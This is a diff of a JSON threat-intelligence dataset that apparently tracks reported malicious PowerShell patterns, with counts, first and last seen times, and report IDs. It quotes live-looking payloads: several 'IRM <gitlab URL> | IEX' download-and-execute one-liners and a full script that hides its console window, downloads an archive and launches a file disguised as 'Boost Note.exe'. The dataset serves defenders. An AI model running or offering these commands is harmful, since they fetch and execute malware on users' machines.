@@ -571,19 +571,11 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 15,
-    "ReportCount": 207,
-    "FirstSeen": "2026-11-09T05:35:49.068000+00:00",
-    "LastSeen": "2026-11-16T03:35:42.273000+00:00",
+    "DistinctPayloadCount": 16,
+    "ReportCount": 200,
+    "FirstSeen": "2026-11-09T06:10:10.773000+00:00",
+    "LastSeen": "2026-11-16T05:31:29.471000+00:00",
     "ReportIds": [
-      "cmw8tvf9t236w0omlli0mmgpj",
-      "cmw8tys4823d20omlhuzrneog",
-      "cmw8u2iag23i20oml5942uu5c",
-      "cmw8u56nh23p00omllkheic3x",
-      "cmw8uh70524bw0omlaskwjtbl",
-      "cmw8uiu3j24fp0omlkiybgric",
-      "cmw8ul00d24kj0omloc83aamq",
-      "cmw8upwsl24q70omlk5d9348w",
       "cmw8v3m4p25c60omll9wdrlb7",
       "cmw8va8cs25q10omlk45er4fd",
       "cmw8vbfut25sz0oml9jcpskyj",
@@ -782,7 +774,8 @@
       "cmwijm8za0zxz0omlgbyn6tef",
       "cmwip7qyl10kv0oml5lmz6u6u",
       "cmwipmr8w10qm0omla41u3zjf",
-      "cmwipnx5h10rt0omlraf3fb6q"
+      "cmwipnx5h10rt0omlraf3fb6q",
+      "cmwitstsl15m00omlpia4l632"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -795,6 +788,7 @@
       "IRM gitlab[.]com/amber-ffa-f15a6b/9e0-4c42-afe7-251068acb178/-/raw/main/abc7-8d4949018f38 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/b788-40ef-9a42-abc325898912/-/raw/main/9fd-a6c523a5e801 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+      "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f | IEX",
       "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
       "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
@@ -827,11 +821,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 44,
-    "FirstSeen": "2026-11-09T05:57:52.513000+00:00",
+    "ReportCount": 43,
+    "FirstSeen": "2026-11-09T08:44:10.966000+00:00",
     "LastSeen": "2026-11-16T03:11:24.720000+00:00",
     "ReportIds": [
-      "cmw8unshl24of0oml3g305qzl",
       "cmw90lnvw2ge50oml5qn3a4im",
       "cmw90t1hq2gzd0oml24praadv",
       "cmw90vgh12h730omlll4eo8h9",
@@ -1002,13 +995,10 @@
   {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
-    "ReportCount": 27,
-    "FirstSeen": "2026-11-09T05:36:29.603000+00:00",
+    "ReportCount": 24,
+    "FirstSeen": "2026-11-09T06:14:48.017000+00:00",
     "LastSeen": "2026-11-14T14:43:31.633000+00:00",
     "ReportIds": [
-      "cmw8twaul23bu0omlsfsgkias",
-      "cmw8uf2tw245m0omlubwlc0vv",
-      "cmw8ugfu224ab0omlylbb1laz",
       "cmw8v9k0f25p90omldjeh182z",
       "cmw8wi5pc27si0omln3w2d5bq",
       "cmw8ywl1j2clu0oml07xszzjx",
